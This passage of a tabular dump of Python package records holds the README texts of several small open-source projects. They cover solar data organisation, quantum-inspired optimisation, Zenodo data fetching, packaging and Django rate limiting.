2. Configure the Sphinx docs to use the theme by editing `conf.py`

    ```python
    html_theme = ""stmaterial""
    ```

3. Your Sphinx documentation's HTML pages will now be generated with this theme! 🎉

",zclab/stmaterial
scoobi,https://github.com/avialxee/scoobi,4,2259,2259,"# scoobi
Solar Conventionality-based Organizing Observation data ( SCOOBI )

```bash
usage: scoobi [-h] [-s SOURCE_FOLDER] [-t TIFF_FOLDER] [-o OUTPUT_FILE] [-c CONFIG_FILE] [-mm MONTH] [-dd DAYS] [-rt] [-ct] [-rc] [-cc]

Solar Conventionality-based Organizing Observation data ( SCOOBI )

options:
  -h, --help            show this help message and exit
  -s SOURCE_FOLDER, --source_folder SOURCE_FOLDER
                        source
  -t TIFF_FOLDER, --tiff_folder TIFF_FOLDER
                        tiff folder path
  -o OUTPUT_FILE, --output_file OUTPUT_FILE
                        complete path for output csv or log file.
  -c CONFIG_FILE, --config_file CONFIG_FILE
                        complete path for config file with inputs
  -mm MONTH, --month MONTH
                        comma separated month names
  -dd DAYS, --days DAYS
                        comma separated month names for range(a,b) Ex --days='1,32'
  -rt, --read-time      reads time from a tiff file
  -ct, --compare-time   compares time from a fits file to a tiff file
  -rc, --read-config    read config, bool
  -cc, --create-config  create config, bool, if called with rc would modify from and to the CONFIG_FILE path
```

# File Conventions


## ORGANIZED FOLDER 

> Front-end Processed data for access through database

### Folder structure
- archived_data_solar
    - final_data
        > contains thumbnails
        - YEAR (int[4])
            - DATE (int[6]) \
                *ex: 20221231*
                - .fits file
                - thumbnails/
                    - .fits file path.stem + 'jpg'
        
    - processed_data 
        > contains thumbnails
        - YEAR (int[4])
            - DATE (int[6]) \
                *ex: 20221231*
                - .fits file
                - thumbnails/
                    - .fits file path.stem + 'jpg'
    - raw_data

- YEAR (int[4])
    - Month (int[2])
        - Day (int[2])


### Naming Convention suggested by committee

*S + DATETIME + TELESCOPE*

*Example : S-2022-11-01T02:02:20.001-HA.fits*



- S : Science data
- F : Flats data
- D : Dark data
- '-' : Separator
- 2022-11-01 : YEAR + Separator + MONTH + Separator + DAY
- T02:02:20.001 : T + hour + minute +seconds +millisecond
- HA : H- alpha telescope
","# scoobi
Solar Conventionality-based Organizing Observation data ( SCOOBI )

```bash
usage: scoobi [-h] [-s SOURCE_FOLDER] [-t TIFF_FOLDER] [-o OUTPUT_FILE] [-c CONFIG_FILE] [-mm MONTH] [-dd DAYS] [-rt] [-ct] [-rc] [-cc]

Solar Conventionality-based Organizing Observation data ( SCOOBI )

options:
  -h, --help            show this help message and exit
  -s SOURCE_FOLDER, --source_folder SOURCE_FOLDER
                        source
  -t TIFF_FOLDER, --tiff_folder TIFF_FOLDER
                        tiff folder path
  -o OUTPUT_FILE, --output_file OUTPUT_FILE
                        complete path for output csv or log file.
  -c CONFIG_FILE, --config_file CONFIG_FILE
                        complete path for config file with inputs
  -mm MONTH, --month MONTH
                        comma separated month names
  -dd DAYS, --days DAYS
                        comma separated month names for range(a,b) Ex --days='1,32'
  -rt, --read-time      reads time from a tiff file
  -ct, --compare-time   compares time from a fits file to a tiff file
  -rc, --read-config    read config, bool
  -cc, --create-config  create config, bool, if called with rc would modify from and to the CONFIG_FILE path
```

# File Conventions


## ORGANIZED FOLDER 

> Front-end Processed data for access through database

### Folder structure
- archived_data_solar
    - final_data
        > contains thumbnails
        - YEAR (int[4])
            - DATE (int[6]) \
                *ex: 20221231*
                - .fits file
                - thumbnails/
                    - .fits file path.stem + 'jpg'
        
    - processed_data 
        > contains thumbnails
        - YEAR (int[4])
            - DATE (int[6]) \
                *ex: 20221231*
                - .fits file
                - thumbnails/
                    - .fits file path.stem + 'jpg'
    - raw_data

- YEAR (int[4])
    - Month (int[2])
        - Day (int[2])


### Naming Convention suggested by committee

*S + DATETIME + TELESCOPE*

*Example : S-2022-11-01T02:02:20.001-HA.fits*



- S : Science data
- F : Flats data
- D : Dark data
- '-' : Separator
- 2022-11-01 : YEAR + Separator + MONTH + Separator + DAY
- T02:02:20.001 : T + hour + minute +seconds +millisecond
- HA : H- alpha telescope
",avialxee/scoobi
pyqea,https://github.com/ferwanguer/PyQEA,1,4192,4192,"
# PyQEA
> Library for Quantum Inspired optimization in python


PyQEA is a extensive research library for Quantum inspired hyper-normal based
optimization in python. 

It is intended for the solution of global optimization problems where conventional 
genetic algorithms or PSO yield sub-optimal results. The current implementation of 
the algorithm allows for a fast deployment of any optimization problem, regardless of the non-linearity of its 
constraints or the complexity of the cost function.

The library has the following features:

## Features
* High level module for Quantum Inspired optimization
* Built-in set of objective cost functions to test the optimization algorithm
* Capacity to implement non-linear restrictions 
* Capcity to implement integral-only variables

To install PyQEA, run this command in your terminal (Currently in test PyPI):

```shell
$ pip install -i https://test.pypi.org/simple/ PyQEA==0.1.5
```

To install the development version as it is, clone the development branch of the repo and then run:

```shell
$ cd PyQEA
$ python setup.py install
```

or: 

```shell
$ cd PyQEA
$ pip install .
```

### Basic Usage: 
PyQEA provides a high level implementation of  the proposed Quantum Inspired algorithm that allows a fast implementation and usage.
It aims to be user-friendly despite the non-trivial nature of its hyper-parameters. We now show the optimization process of a paraboloid (Sphere function)
of input dimension `n` centered in the vector: `[3.8, 3.8, 3.8, 3.8, ...]`. 

### Use case example: 

The optimizer setup is as follows:
```python
import numpy as np

from PyQEA import QuantumEvAlgorithm
from PyQEA.utils.cost_functions import f

n_dims = 10 # Input dimensions of f(x)
up = 5.12 *np.ones(n_dims) # Upper bound defined for the input variables
low = -5*np.ones(n_dims)  # Lower bound defined for the input variables

integrals = np.full(n_dims, False) #Boolean vector defining which variables are integral

cost_function = f

optimizer = QuantumEvAlgorithm(cost_function, n_dims=n_dims, upper_bound=up,
                                     lower_bound=low, integral_id=integrals,
                                     sigma_scaler=1.003,
                                     mu_scaler=20, elitist_level=6,
                                     restrictions=[])

results = optimizer.training(N_iterations=4000, sample_size=20)
```
The following example showcases the usage of the optimizer for a constrained-optimization problem
```python

from PyQEA import QuantumEvAlgorithm
from PyQEA.utils.cost_functions import f

def h(x: np.ndarray):
    """"""Definition of the restriction to be applied to the opt problem""""""

    if x.ndim == 1:
        x = x[None]

    n_dims = x.shape[1]

    return  -x[:,1 ] - x[:,0] + 6.1

n_dims = 10
up = 5*np.ones(n_dims)
low = -5*np.ones(n_dims)
integrals = np.full(n_dims, False)
integrals[0:2] = True

optimizer = QuantumEvAlgorithm(f, n_dims=n_dims, upper_bound=up,
                                     lower_bound=low, integral_id=integrals,
                                     sigma_scaler=1.003,
                                     mu_scaler=20, elitist_level=6,
                                     restrictions=[h])

results = optimizer.training(N_iterations=4000, sample_size=20, save=False,
                             filename='q11.npz')
````
### Parameter tuning
The main limitation that the user may encounter in the use of this optimizer is
the non-trivial character of it's hyper-parameters. The critical hyper-parameters
are the ones that regulate the update of hyper-normal distribution after the evaluation
of the sampled population.

The recommended rule of thumb is the following: 

* `mu_scaler ~ 20` (It is not as critical for performance)
* `sigma_scaler ~ (1 + 1/(10*n))` being `n` the number of input dimensions of the problem

The key concept to bear in mind is that, as the dimensionality of the problem increases, it is necessary to make the algorithm more ""cautious"", therefore minimizing the difference between before and after distributions. In practical terms, as the complexity of a given
problem increases, sigma_scaler must tend to ~1.

Pending to be uploaded to PyPI


","
# PyQEA
> Library for Quantum Inspired optimization in python


PyQEA is a extensive research library for Quantum inspired hyper-normal based
optimization in python. 

It is intended for the solution of global optimization problems where conventional 
genetic algorithms or PSO yield sub-optimal results. The current implementation of 
the algorithm allows for a fast deployment of any optimization problem, regardless of the non-linearity of its 
constraints or the complexity of the cost function.

The library has the following features:

## Features
* High level module for Quantum Inspired optimization
* Built-in set of objective cost functions to test the optimization algorithm
* Capacity to implement non-linear restrictions 
* Capcity to implement integral-only variables

To install PyQEA, run this command in your terminal (Currently in test PyPI):

```shell
$ pip install -i https://test.pypi.org/simple/ PyQEA==0.1.5
```

To install the development version as it is, clone the development branch of the repo and then run:

```shell
$ cd PyQEA
$ python setup.py install
```

or: 

```shell
$ cd PyQEA
$ pip install .
```

### Basic Usage: 
PyQEA provides a high level implementation of  the proposed Quantum Inspired algorithm that allows a fast implementation and usage.
It aims to be user-friendly despite the non-trivial nature of its hyper-parameters. We now show the optimization process of a paraboloid (Sphere function)
of input dimension `n` centered in the vector: `[3.8, 3.8, 3.8, 3.8, ...]`. 

### Use case example: 

The optimizer setup is as follows:
```python
import numpy as np

from PyQEA import QuantumEvAlgorithm
from PyQEA.utils.cost_functions import f

n_dims = 10 # Input dimensions of f(x)
up = 5.12 *np.ones(n_dims) # Upper bound defined for the input variables
low = -5*np.ones(n_dims)  # Lower bound defined for the input variables

integrals = np.full(n_dims, False) #Boolean vector defining which variables are integral

cost_function = f

optimizer = QuantumEvAlgorithm(cost_function, n_dims=n_dims, upper_bound=up,
                                     lower_bound=low, integral_id=integrals,
                                     sigma_scaler=1.003,
                                     mu_scaler=20, elitist_level=6,
                                     restrictions=[])

results = optimizer.training(N_iterations=4000, sample_size=20)
```
The following example showcases the usage of the optimizer for a constrained-optimization problem
```python

from PyQEA import QuantumEvAlgorithm
from PyQEA.utils.cost_functions import f

def h(x: np.ndarray):
    """"""Definition of the restriction to be applied to the opt problem""""""

    if x.ndim == 1:
        x = x[None]

    n_dims = x.shape[1]

    return  -x[:,1 ] - x[:,0] + 6.1

n_dims = 10
up = 5*np.ones(n_dims)
low = -5*np.ones(n_dims)
integrals = np.full(n_dims, False)
integrals[0:2] = True

optimizer = QuantumEvAlgorithm(f, n_dims=n_dims, upper_bound=up,
                                     lower_bound=low, integral_id=integrals,
                                     sigma_scaler=1.003,
                                     mu_scaler=20, elitist_level=6,
                                     restrictions=[h])

results = optimizer.training(N_iterations=4000, sample_size=20, save=False,
                             filename='q11.npz')
````
### Parameter tuning
The main limitation that the user may encounter in the use of this optimizer is
the non-trivial character of it's hyper-parameters. The critical hyper-parameters
are the ones that regulate the update of hyper-normal distribution after the evaluation
of the sampled population.

The recommended rule of thumb is the following: 

* `mu_scaler ~ 20` (It is not as critical for performance)
* `sigma_scaler ~ (1 + 1/(10*n))` being `n` the number of input dimensions of the problem

The key concept to bear in mind is that, as the dimensionality of the problem increases, it is necessary to make the algorithm more ""cautious"", therefore minimizing the difference between before and after distributions. In practical terms, as the complexity of a given
problem increases, sigma_scaler must tend to ~1.

Pending to be uploaded to PyPI


",ferwanguer/pyqea
datarig,https://github.com/mscaudill/datarig,15,5517,3756,"<h1 align=""center"">
    <img src=""https://github.com/mscaudill/datarig/blob/master/docs/imgs/logo.png"" 
    style=""width:700px;height:auto;""/>
</h1>

<p align=""center"">
  <a href=""https://github.com/mscaudill/datarig/blob/master/LICENSE""><img
    src=""https://img.shields.io/badge/License-BSD%203--Clause-teal"" 
    alt=""DataRig is released under the BSD 3-Clause license."" />
  </a>
  <a href=""https://github.com/mscaudill/datarig/tree/master#Dependencies""><img 
    src=""https://img.shields.io/pypi/pyversions/datarig?logo=python&logoColor=gold"" 
    alt=""Python versions supported."" />
  </a>
<a href=""https://github.com/mscaudill/openseize/actions/workflows/test.yml""><img 
    src=""https://img.shields.io/github/actions/workflow/status/mscaudill/datarig/test.yml?label=CI&logo=github"" 
    alt=""DataRig's test status"" />
  </a>
 <a href=""https://github.com/mscaudill/datarig/pulls""><img 
    src=""https://img.shields.io/badge/PRs-welcome-F8A3A3""
    alt=""Pull Request Welcomed!"" />
  </a>
</p>

<p align=""center""  style=""font-size: 20px"">
<a href=""#Key-Features"">Features</a>   |  
<a href=""#Installation"">Installation</a>   |  
<a href=""#Dependencies"">Dependencies</a>   |  
<a href=""#Documentation"">Documentation</a>   |  
<a href=""#Attribution"">Attribution</a>   |  
<a href=""#Contributions"">Contributions</a>   |  
<a href=""#Issues"">Issues</a>   |  
<a href=""#Acknowledgements"">Acknowledgements</a> 
</p>

# Features
Providing large testing and demo data alongside your package releases is
challenging for two reasons. First, code repositories have strict limits on file
sizes. Second, you don't want your users to wait forever to download your cool
package because you've included large data files.  If you're a python developer
and have hit these issues then <b><a href=https://github.com/mscaudill/datarig
target=_blank>DataRig</a></b> is for you.  DataRig allows you to
move data from web-based repositories into your user's local directories
post-installation. This ""just-in-time"" data fetching is perfect for users to
test or run your package's demos.

# Installation
DataRig can be installed into your projects environment using pip:

1. Activate the virtual or conda environment of your package
```Shell
$ source <YOUR_ENV>/bin/activate # python virtual environment
```

```Shell
$ conda activate <YOUR_ENV>
```

2. Install DataRig to your active environment
```Shell
(<YOUR_ENV>)$ pip install datarig
```

# Dependencies

DataRig is super lightweight requiring just <b>Python <span>&#8805;</span>
3.9</b> and the request library available here:

<table>

<tr>
    <th>package</th>
    <th>pypi</th>
    <th>conda</th>
  </tr>

<tr>
    <td><a href=""https://requests.readthedocs.io/en/latest/"" 
        target=_blank>requests</a></td>
    <td>https://pypi.org/project/requests/</td>
    <td align='center'><span>&#10003;</span></td>
  </tr>

</table>

# Documentation
Using DataRig to access a repository is simple. Just build a <b>Record</b>
instance and all the data will be at your fingertips. Here's how to do it for
a sample Zenodo repository:
```Shell
$ ipython
```
```python
>>> from datarig import Zenodo
>>> # set the url to the api endpoint url for the record id 7868945
>>> url = 'http://zenodo.org/api/records/7868945'
>>> record = Zenodo(url)
```
This record contains all of the repositories information stored as attributes.
To see everything at once, just print the record.
```python
>>> print(record)
```
You will see a datasets attribute with a list of Dataset objects. These Datasets
contain the name, url link, size and file type of the datasets that can be
downloaded from the repository record. Let's print each of them.
```python
>>> for dset in record.datasets:
...     print(dset)
```
Notice that a Dataset instance describes the data but does not contain the
actual data. To get the data to your machine, you call call the records
'download' method. Let's get help for this method before calling it.
```python
>>> help(record.download)
```
To call this method we need a directory to place the downloaded data, the name
of the dataset to download, the amount of memory to use during downloading
(chunksize) and a boolean of whether the download should be streamed to disk.
Streaming is usually the right choice since the files you will download are
likely large. Let's download the ""sample_arr.npy"" file from this record into
your current working dir.
```python
>>> from pathlib import Path
>>> record.download(directory=None, name='sample_arr.npy')
```

That's it! You've just downloaded a dataset from a Zenodo record :sunglasses:


# Attribution
If you find DataRig useful, please cite the Zenodo archive of this repository.

If you really like DataRig, you can also star the <a
href=https://github.com/mscaudill/datarig>repository</a> 
<span>&#11088;</span>!

# Contributions
Contributions are what makes open-source fun and we would love for you to
contribute. Please check out our [contribution guide](
https://github.com/mscaudill/datarig/blob/master/.github/CONTRIBUTING.md)
to get started.

# Issues

DataRig provides custom issue templates for filing bugs, requesting
feature enhancements, suggesting documentation changes, or just asking
questions. *Ready to discuss?* File an issue <a
href=https://github.com/mscaudill/datarig/issues/new/choose>here</a>. 

# Acknowledgements

**This work is generously supported through the Ting Tsung and Wei Fong Chao 
Foundation and the National Institute of Neurological Disorders and Stroke 
(Grant 2R01 NS100738-05A1).**



","













Features   |  
Installation   |  
Dependencies   |  
Documentation   |  
Attribution   |  
Contributions   |  
Issues   |  
Acknowledgements


# Features
Providing large testing and demo data alongside your package releases is
challenging for two reasons. First, code repositories have strict limits on file
sizes. Second, you don't want your users to wait forever to download your cool
package because you've included large data files.  If you're a python developer
and have hit these issues then DataRig is for you.  DataRig allows you to
move data from web-based repositories into your user's local directories
post-installation. This ""just-in-time"" data fetching is perfect for users to
test or run your package's demos.

# Installation
DataRig can be installed into your projects environment using pip:

1. Activate the virtual or conda environment of your package
```Shell
$ source /bin/activate # python virtual environment
```

```Shell
$ conda activate 
```

2. Install DataRig to your active environment
```Shell
()$ pip install datarig
```

# Dependencies

DataRig is super lightweight requiring just Python ≥
3.9 and the request library available here:



package
pypi
conda


requests
https://pypi.org/project/requests/
✓



# Documentation
Using DataRig to access a repository is simple. Just build a Record
instance and all the data will be at your fingertips. Here's how to do it for
a sample Zenodo repository:
```Shell
$ ipython
```
```python
>>> from datarig import Zenodo
>>> # set the url to the api endpoint url for the record id 7868945
>>> url = 'http://zenodo.org/api/records/7868945'
>>> record = Zenodo(url)
```
This record contains all of the repositories information stored as attributes.
To see everything at once, just print the record.
```python
>>> print(record)
```
You will see a datasets attribute with a list of Dataset objects. These Datasets
contain the name, url link, size and file type of the datasets that can be
downloaded from the repository record. Let's print each of them.
```python
>>> for dset in record.datasets:
...     print(dset)
```
Notice that a Dataset instance describes the data but does not contain the
actual data. To get the data to your machine, you call call the records
'download' method. Let's get help for this method before calling it.
```python
>>> help(record.download)
```
To call this method we need a directory to place the downloaded data, the name
of the dataset to download, the amount of memory to use during downloading
(chunksize) and a boolean of whether the download should be streamed to disk.
Streaming is usually the right choice since the files you will download are
likely large. Let's download the ""sample_arr.npy"" file from this record into
your current working dir.
```python
>>> from pathlib import Path
>>> record.download(directory=None, name='sample_arr.npy')
```

That's it! You've just downloaded a dataset from a Zenodo record :sunglasses:


# Attribution
If you find DataRig useful, please cite the Zenodo archive of this repository.

If you really like DataRig, you can also star the repository
⭐!

# Contributions
Contributions are what makes open-source fun and we would love for you to
contribute. Please check out our [contribution guide](
https://github.com/mscaudill/datarig/blob/master/.github/CONTRIBUTING.md)
to get started.

# Issues

DataRig provides custom issue templates for filing bugs, requesting
feature enhancements, suggesting documentation changes, or just asking
questions. *Ready to discuss?* File an issue here. 

# Acknowledgements

**This work is generously supported through the Ting Tsung and Wei Fong Chao 
Foundation and the National Institute of Neurological Disorders and Stroke 
(Grant 2R01 NS100738-05A1).**



",mscaudill/datarig
cpchecker,https://github.com/pypa/sampleproject,0,2356,2356,"
# Make sure you have upgraded version of pip
Windows
```
py -m pip install --upgrade pip
```

Linux/MAC OS
```
python3 -m pip install --upgrade pip
```

## Create a project with the following structure
```
packaging_tutorial/
├── LICENSE
├── pyproject.toml
├── README.md
├── setup.cfg
├── src/
│   └── example_package/
│       ├── __init__.py
│       └── example.py
└── tests/
touch LICENSE
touch pyproject.toml
touch setup.cfg
mkdir src/mypackage
touch src/mypackage/__init__.py
touch src/mypackage/main.py
mkdir tests
```

## pyproject.toml 

This file tells tools like pip and build how to create your project

```
[build-system]
requires = [
    ""setuptools>=42"",
    ""wheel""
]
build-backend = ""setuptools.build_meta""
```
build-system.requires gives a list of packages that are needed to build your package. Listing something here will only make it available during the build, not after it is installed.

build-system.build-backend is the name of Python object that will be used to perform the build. If you were to use a different build system, such as flit or poetry, those would go here, and the configuration details would be completely different than the setuptools configuration described below.


# Setup.cfg setup
Using setup.cfg is a best practice, but you could have a dynamic setup file using setup.py

```
[metadata]
name = example-pkg-YOUR-USERNAME-HERE
version = 0.0.1
author = Example Author
author_email = author@example.com
description = A small example package
long_description = file: README.md
long_description_content_type = text/markdown
url = https://github.com/pypa/sampleproject
project_urls =
    Bug Tracker = https://github.com/pypa/sampleproject/issues
classifiers =
    Programming Language :: Python :: 3
    License :: OSI Approved :: MIT License
    Operating System :: OS Independent

[options]
package_dir =
    = src
packages = find:
python_requires = >=3.6

[options.packages.find]
where = src

```
# Running the build
### Make sure your build tool is up to date
Windows
```
py -m pip install --upgrade build
```
Linux/MAC OS
```
python3 -m pip install --upgrade build
```


### Create the build
```
py -m build
```













### References
https://packaging.python.org/tutorials/packaging-projects/
","
# Make sure you have upgraded version of pip
Windows
```
py -m pip install --upgrade pip
```

Linux/MAC OS
```
python3 -m pip install --upgrade pip
```

## Create a project with the following structure
```
packaging_tutorial/
├── LICENSE
├── pyproject.toml
├── README.md
├── setup.cfg
├── src/
│   └── example_package/
│       ├── __init__.py
│       └── example.py
└── tests/
touch LICENSE
touch pyproject.toml
touch setup.cfg
mkdir src/mypackage
touch src/mypackage/__init__.py
touch src/mypackage/main.py
mkdir tests
```

## pyproject.toml 

This file tells tools like pip and build how to create your project

```
[build-system]
requires = [
    ""setuptools>=42"",
    ""wheel""
]
build-backend = ""setuptools.build_meta""
```
build-system.requires gives a list of packages that are needed to build your package. Listing something here will only make it available during the build, not after it is installed.

build-system.build-backend is the name of Python object that will be used to perform the build. If you were to use a different build system, such as flit or poetry, those would go here, and the configuration details would be completely different than the setuptools configuration described below.


# Setup.cfg setup
Using setup.cfg is a best practice, but you could have a dynamic setup file using setup.py

```
[metadata]
name = example-pkg-YOUR-USERNAME-HERE
version = 0.0.1
author = Example Author
author_email = author@example.com
description = A small example package
long_description = file: README.md
long_description_content_type = text/markdown
url = https://github.com/pypa/sampleproject
project_urls =
    Bug Tracker = https://github.com/pypa/sampleproject/issues
classifiers =
    Programming Language :: Python :: 3
    License :: OSI Approved :: MIT License
    Operating System :: OS Independent

[options]
package_dir =
    = src
packages = find:
python_requires = >=3.6

[options.packages.find]
where = src

```
# Running the build
### Make sure your build tool is up to date
Windows
```
py -m pip install --upgrade build
```
Linux/MAC OS
```
python3 -m pip install --upgrade build
```


### Create the build
```
py -m build
```













### References
https://packaging.python.org/tutorials/packaging-projects/
",pypa/sampleproject
nonebot-desktop-tk,https://github.com/nonedesktop/nonebot-desktop-tk,2,639,639,"# nonebot-desktop-tk

使用 Tkinter 编写的图形化 NoneBot2 项目管理器。

## 常规安装（未完成）

## 从命令行安装与启动（不推荐）

> 注意：
>
> - Windows 用户请确保
>   - 你使用的 Python 版本为 3.8 或更高；
>
>     > 如果安装了多个版本的 Python，可以通过 `py -3.x`(x >= 8) 在命令行使用指定版本的 Python。
>
>   - 安装 Python 时也安装了 Tkinter 相关组件。
>
>     > Python 官网安装包默认安装，自定义安装需要注意。
>
> - Linux 用户请确保
>   - 你使用的 Python 版本为 3.8 或更高；
>
>     > 如果安装了多个版本的 Python，可以通过 `python3.x`(x >= 8) 在命令行使用指定版本的 Python。
>
>   - 已经通过包管理器等安装了 `tcl` 和 `tk` 这两个包。
>
> 如果要指定 Python 版本，请将下面的 `python` 替换成指定了版本的 Python 程序，
> `pip` 替换成 `{指定了版本的 Python 程序} -m pip`。

```console
# 安装
pip install nonebot-desktop-tk
# 启动
python -m nonebot_desktop_tk
```
","# nonebot-desktop-tk

使用 Tkinter 编写的图形化 NoneBot2 项目管理器。

## 常规安装（未完成）

## 从命令行安装与启动（不推荐）

> 注意：
>
> - Windows 用户请确保
>   - 你使用的 Python 版本为 3.8 或更高；
>
>     > 如果安装了多个版本的 Python，可以通过 `py -3.x`(x >= 8) 在命令行使用指定版本的 Python。
>
>   - 安装 Python 时也安装了 Tkinter 相关组件。
>
>     > Python 官网安装包默认安装，自定义安装需要注意。
>
> - Linux 用户请确保
>   - 你使用的 Python 版本为 3.8 或更高；
>
>     > 如果安装了多个版本的 Python，可以通过 `python3.x`(x >= 8) 在命令行使用指定版本的 Python。
>
>   - 已经通过包管理器等安装了 `tcl` 和 `tk` 这两个包。
>
> 如果要指定 Python 版本，请将下面的 `python` 替换成指定了版本的 Python 程序，
> `pip` 替换成 `{指定了版本的 Python 程序} -m pip`。

```console
# 安装
pip install nonebot-desktop-tk
# 启动
python -m nonebot_desktop_tk
```
",nonedesktop/nonebot-desktop-tk
encoded-core,https://github.com/smaht-dac/encoded-core,35,174,174,"============
encoded-core
============


Welcome to ``encoded-core``!

This library contains common data models used across ENCODE style projects
implemented by the Park Lab.","============
encoded-core
============


Welcome to ``encoded-core``!

This library contains common data models used across ENCODE style projects
implemented by the Park Lab.",smaht-dac/encoded-core
classconfig,https://github.com/mdocekal/classconfig,1,3320,3320,"# classconfig
Package for creating (yaml) configuration files automatically and loading objects from those configuration files.

## Installation
You can install it using pip:

    pip install classconfig

## Usage
At first we need a class that is configurable it means that it has `ConfigurableAttribute` class members. Such as
`ConfigurableValue` or `ConfigurableFactory`. Let's create two simple classes where one of them will have the other 
instance as a member:

```python
from classconfig import ConfigurableValue, ConfigurableFactory, ConfigurableMixin


class Inventory(ConfigurableMixin):
    size: int = ConfigurableValue(desc=""Size of an inventory"", user_default=10, validator=lambda x: x > 0)


class Character(ConfigurableMixin):
    lvl: int = ConfigurableValue(desc=""Level of a character"", user_default=1, validator=lambda x: x > 0)
    name: str = ConfigurableValue(desc=""Name of a character"")
    inventory: Inventory = ConfigurableFactory(desc=""Character's inventory"", cls_type=Inventory)

```

You can see that the usage is similar to dataclasses as it also uses descriptors. You can omit the `ConfigurableMixin`
inheritance but then you will have to write your own `__init__` method e.g.:

```python
class Inventory:
    size: int = ConfigurableValue(desc=""Size of an inventory"", user_default=10, validator=lambda x: x > 0)

    def __init__(self, size: int):
        self.size = size
```

### Creating configuration file
Now let's create a configuration file for our `Character` class. You can do it by calling `save` method of `Config` class:

```python
from classconfig import Config

Config(Character).save(""config.yaml"")
```

You will get a file with the following content:

### Validation
As you have seen in the previous example, it is possible to add a validator. 
A validator could be any callable that takes one argument and return `True` when valid. 
You can also raise an exception if the argument is invalid to specify the reason for the failure.

There are various predefined validators in `classconfig.validators` module.

### Transformation
It is possible to specify a transformation (`transform` attribute) that will transform user input. The transformation
is done before the validation. Thus, it can be used to transform input into valid form.

It can be any callable that takes one argument and returns the transformed value, but there also exist some predefined
transformations in `classconfig.transforms` module.


```yaml
lvl: 1  # Level of a character
name: # Name of a character
inventory: # Character's inventory
  size: 10  # Size of an inventory
```

### Loading
Now let's load the configuration file we just created and create an instance of `Character` class:

```python
from classconfig import Config, ConfigurableFactory

config = Config(Character).load(path)   # load configuration file
loaded_obj = ConfigurableFactory(Character).create(config)  # create an instance of Character class
```

## Why YAML?
YAML is a human-readable data serialization language. It is easy to read and write. It is also easy to parse and
generate.

It supports hierarchical data structures, which are very useful when you need to represent configuration 
of a class that has other configurable classes as members.

It supports comments, unlike e.g. json, which is also a big advantage.

","# classconfig
Package for creating (yaml) configuration files automatically and loading objects from those configuration files.

## Installation
You can install it using pip:

    pip install classconfig

## Usage
At first we need a class that is configurable it means that it has `ConfigurableAttribute` class members. Such as
`ConfigurableValue` or `ConfigurableFactory`. Let's create two simple classes where one of them will have the other 
instance as a member:

```python
from classconfig import ConfigurableValue, ConfigurableFactory, ConfigurableMixin


class Inventory(ConfigurableMixin):
    size: int = ConfigurableValue(desc=""Size of an inventory"", user_default=10, validator=lambda x: x > 0)


class Character(ConfigurableMixin):
    lvl: int = ConfigurableValue(desc=""Level of a character"", user_default=1, validator=lambda x: x > 0)
    name: str = ConfigurableValue(desc=""Name of a character"")
    inventory: Inventory = ConfigurableFactory(desc=""Character's inventory"", cls_type=Inventory)

```

You can see that the usage is similar to dataclasses as it also uses descriptors. You can omit the `ConfigurableMixin`
inheritance but then you will have to write your own `__init__` method e.g.:

```python
class Inventory:
    size: int = ConfigurableValue(desc=""Size of an inventory"", user_default=10, validator=lambda x: x > 0)

    def __init__(self, size: int):
        self.size = size
```

### Creating configuration file
Now let's create a configuration file for our `Character` class. You can do it by calling `save` method of `Config` class:

```python
from classconfig import Config

Config(Character).save(""config.yaml"")
```

You will get a file with the following content:

### Validation
As you have seen in the previous example, it is possible to add a validator. 
A validator could be any callable that takes one argument and return `True` when valid. 
You can also raise an exception if the argument is invalid to specify the reason for the failure.

There are various predefined validators in `classconfig.validators` module.

### Transformation
It is possible to specify a transformation (`transform` attribute) that will transform user input. The transformation
is done before the validation. Thus, it can be used to transform input into valid form.

It can be any callable that takes one argument and returns the transformed value, but there also exist some predefined
transformations in `classconfig.transforms` module.


```yaml
lvl: 1  # Level of a character
name: # Name of a character
inventory: # Character's inventory
  size: 10  # Size of an inventory
```

### Loading
Now let's load the configuration file we just created and create an instance of `Character` class:

```python
from classconfig import Config, ConfigurableFactory

config = Config(Character).load(path)   # load configuration file
loaded_obj = ConfigurableFactory(Character).create(config)  # create an instance of Character class
```

## Why YAML?
YAML is a human-readable data serialization language. It is easy to read and write. It is also easy to parse and
generate.

It supports hierarchical data structures, which are very useful when you need to represent configuration 
of a class that has other configurable classes as members.

It supports comments, unlike e.g. json, which is also a big advantage.

",mdocekal/classconfig
sdc-sdk,https://github.com/secretflow/secure-data-capsule-sdk,3,35,35,"Secure Data Capsule SDK for python
","Secure Data Capsule SDK for python
",secretflow/secure-data-capsule-sdk
django-ns-ratelimit,https://github.com/shaileshkumar123/django-ns-ratelimit,0,1527,1527,"# DJANGO-NS-RATELIMIT

## Project description
django-ns-ratelimit is django app for limit requests using rate limit class, decorators and middleware.

## Usage

# Periods in format:
```
    S: For seconds
    M: For minutes
    H: For hour
    D: For Day

    e.g: ""10S"" ""1M"" ""1D""
```

## Decorators
### user_method_ratelimit:
Used for user specific request rate limiting for class base apis

```
class SampleView(APIView):
    @user_method_ratelimit(5, ""1M"")
    def get(self, request):
        pass
```

### anon_method_ratelimit:
Used for Anonymous user requests rate limiting for class base apis

```
class SampleView(APIView):
    @anon_method_ratelimit(5, ""1M"")
    def get(self, request):
        pass
```

### user_func_ratelimit:
Used for user specific request rate limiting for function base apis

```
class SampleView(APIView):
    @user_func_ratelimit(5, ""1M"")
    def get(self, request):
        pass
```

### anon_func_ratelimit:
Used for Anonymous user requests rate limiting for function base apis

```
class SampleView(APIView):
    @anon_func_ratelimit(5, ""1M"")
    def get(self, request):
        pass
```

## Middlewares

### UserRateLimitMiddleware

Add this django settings Middlewares for User rate limiting
```
MIDDLEWARE = [
    .
    .
    .
    .
    ""ratelimit.middleware.UserRateLimitMiddleware"",
]
```

### AnonRateLimitMiddleware

Add this django settings Middlewares for Anonymous rate limiting
```
MIDDLEWARE = [
    .
    .
    .
    .
    ""ratelimit.middleware.AnonRateLimitMiddleware"",
]
```","# DJANGO-NS-RATELIMIT

## Project description
django-ns-ratelimit is django app for limit requests using rate limit class, decorators and middleware.

## Usage

# Periods in format:
```
    S: For seconds
    M: For minutes
    H: For hour
    D: For Day

    e.g: ""10S"" ""1M"" ""1D""
```

## Decorators
### user_method_ratelimit:
Used for user specific request rate limiting for class base apis

```
class SampleView(APIView):
    @user_method_ratelimit(5, ""1M"")
    def get(self, request):
        pass
```

### anon_method_ratelimit:
Used for Anonymous user requests rate limiting for class base apis

```
class SampleView(APIView):
    @anon_method_ratelimit(5, ""1M"")
    def get(self, request):
        pass
```

### user_func_ratelimit:
Used for user specific request rate limiting for function base apis

```
class SampleView(APIView):
    @user_func_ratelimit(5, ""1M"")
